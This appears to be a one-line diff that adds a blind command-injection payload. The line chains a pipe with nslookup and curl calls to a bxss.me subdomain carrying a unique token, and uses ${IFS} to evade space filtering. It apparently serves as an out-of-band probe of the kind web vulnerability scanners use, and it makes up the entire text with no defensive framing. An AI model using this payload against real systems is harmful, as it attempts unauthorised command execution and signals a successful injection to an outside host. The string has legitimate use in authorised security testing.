@@ -1,0 +1,1 @@
+|(nslookup${IFS}-q${IFS}cname${IFS}hitxywoafwbff10ff1.bxss.me||curl${IFS}hitxywoafwbff10ff1.bxss.me)
